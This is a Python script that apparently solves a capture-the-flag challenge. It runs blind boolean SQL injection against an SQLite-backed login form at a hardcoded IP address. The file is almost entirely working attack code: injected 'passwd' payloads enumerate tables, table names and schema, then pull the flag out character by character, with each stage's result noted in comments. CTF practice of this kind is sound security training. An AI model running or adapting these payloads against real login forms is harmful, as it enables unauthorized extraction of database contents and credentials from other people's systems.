import requests

url = 'http://61.28.237.24:30100/'

# NUMBER OF TABLE
# --> RESULT = 2 TABLES
'''
obj = {
    "username": "admin",
    "passwd": "' or ((SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < 3) -- -"
}
rs = requests.post(url, data=obj)
print(rs.text)
'''

# PAYLOAD LENGHT FOR EACH TABLE
# --> RESULT:
# Table 1: 5 chars
# Table 2: 23 chars
'''
for i in range(2):
    j = 2
    while True:
        obj = {
            "username": "admin",
            "passwd": f"' or ((SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset {i} ) < {j}) -- -"
        }
        print(f'{i}, {j}')
        rs = requests.post(url, data=obj)
        if "Nothing special here." in rs.text:
            print(f"Table {i + 1}: {j-1} chars")
            break
        j += 1
'''

# EXPLOIT TABLE NAME
# -->RESULT:
# TABLE 1: users
# TABLE 2: flagtablewithrandomname
'''
for i in range(2):
    emptyChar = True
    j = 1
    print(f"TABLE {i + 1} :", end='', flush=True)
    while True:
        for k in range(33, 127):
            obj = {
                "username": "admin",
                "passwd": f"' or ((SELECT substr(tbl_name,{j},1) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset {i}) = '{chr(k)}') -- -"
            }
            rs = requests.post(url, data=obj)
            if "admin" in rs.text:
                print(chr(k), end='', flush=True)
                emptyChar = False
                break

        if emptyChar:
            print('\n', end='', flush=True)
            break

        j += 1
        emptyChar = True
'''

# LEAK structure sql of flagtablewithrandomname table
# --> RESULT:CREATE(?)TABLE(?)flagtablewithrandomname(flag)(?)(?)(?)(?)(?)
'''
for i in range(100):
    nullChar = True
    for j in range(33, 127):
        obj = {
            "username": "admin",
            "passwd": f"' or ((SELECT substr(group_concat(sql),{i+1},1) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name='flagtablewithrandomname') = '{chr(j)}')-- -"
        }
        rs = requests.post(url, data=obj)
        if "admin" in rs.text:
            nullChar = False
            print(chr(j), end='', flush=True)
            break
    if (nullChar):
        print('(?)', end='', flush=True)
'''

# LEAK number row of flag  table
# --> RESULT: 1 row
'''
for i in range(100):
    obj = {
        "username": "admin",
        "passwd": f"' or ((SELECT count(flag) FROM flagtablewithrandomname) = {i})-- -"
    }
    rs = requests.post(url, data=obj)
    if "admin" in rs.text:
        print(f"{i} rows", end='', flush=True)
        break
'''

# Leak FLAG:
# -->RESULT: HCMUS-CTF{easY_sql_1nj3ctIon}(?)(?)(?)(?)(?)
for i in range(100):
    nullChar = True
    for j in range(33, 127):
        obj = {
            "username": "admin",
            "passwd": f"' or ((SELECT substr(flag,{i+1},1) FROM flagtablewithrandomname) = '{chr(j)}')-- -"
        }
        rs = requests.post(url, data=obj)
        if "admin" in rs.text:
            nullChar = False
            print(chr(j), end='', flush=True)
            break
    if (nullChar):
        print('(?)', end='', flush=True)
